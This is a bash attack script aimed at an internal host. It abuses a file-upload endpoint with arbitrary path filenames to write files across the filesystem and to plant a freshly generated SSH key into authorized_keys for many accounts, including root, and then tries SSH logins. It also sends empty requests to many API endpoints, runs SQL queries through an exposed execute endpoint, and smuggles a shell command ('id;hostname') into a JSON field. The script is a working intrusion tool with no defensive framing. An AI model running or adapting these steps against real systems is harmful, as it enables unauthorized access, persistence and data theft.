#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
H=192.168.0.22
L=/root/ul_farmfan/o5.txt; mkdir -p /root/ul_farmfan; : > $L
log(){ echo "$@" | cut -c1-900 >> $L; }
px(){ timeout 10 curl -s -m 8 -X POST "$1" -H 'Content-Type: application/json' -d "$2" -w "|%{http_code}" 2>/dev/null; }
log "S $(date -u +%FT%TZ) me=$(id -un)@$(hostname)"
log "HEALTH14 $(timeout 8 curl -s -m 6 http://$H:14998/health | tr -d '\n' | cut -c1-700)"
log "TOOLS18 $(timeout 8 curl -s -m 6 http://$H:18000/tools | tr -d '\n' | cut -c1-1800)"
echo 'UL5512-P5' > /tmp/m5.txt
for fn in /root/ul_p5.txt /etc/ul_p5.txt /opt/ul_p5.txt /usr/local/bin/ul_p5.txt /home/ul_p5.txt; do
  log "W $fn => $(timeout 10 curl -s -m 8 -X POST http://$H:14998/upload -F "file=@/tmp/m5.txt;filename=$fn" -w '|%{http_code}' 2>/dev/null | tr '\n' ' ')"
done
ssh-keygen -t ed25519 -f /tmp/ul5512 -N '' -C ul-t2-5512 >/dev/null 2>&1
PUB=$(cat /tmp/ul5512.pub); log "PUB=$PUB"
for u in liuqi ubuntu app vcc kgzs root deploy nobody www-data; do
  cp /tmp/ul5512.pub /tmp/ak_$u.txt
  R=$(timeout 10 curl -s -m 8 -X POST http://$H:14998/upload -F "file=@/tmp/ak_$u.txt;filename=/home/$u/.ssh/authorized_keys" -w '|%{http_code}' 2>/dev/null | tr '\n' ' ')
  log "AK /home/$u => $(echo "$R" | cut -c1-220)"
  S=$(timeout 12 ssh -i /tmp/ul5512 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 $u@$H 'id; hostname; nvidia-smi -L 2>/dev/null|head -2' 2>&1 | tr '\n' ' ' | cut -c1-160)
  log "SSH $u => $S"
  case "$S" in *uid=*) log "HITSSH $u"; break;; esac
done
for ep in eventclassify point2/analyze point3/analyze api/batch_test ea/discover ta/evaluate llm/generate predict api/tnsd_preview api/sentiment_detail_steps api/automation/ta_run upload_conf; do
  log "EMPTY $ep => $(px http://$H:14998/$ep '{}' | tr '\n' ' ')"
done
log "RDBTABLES $(px http://$H:18000/execute '{"engine":"relational_db","operation":"query","arguments":{"sql":"select name from sqlite_master"}}' | tr '\n' ' ')"
log "RDBPROJ $(px http://$H:18000/execute '{"engine":"relational_db","operation":"query","arguments":{"sql":"select * from projects limit 5"}}' | tr '\n' ' ')"
log "RESEARCH $(px http://$H:18000/api/research/jobs '{"topic":"id;hostname","depth":1}' | tr '\n' ' ')"
log "E $(date -u +%FT%TZ)"
tail -c 8000 $L
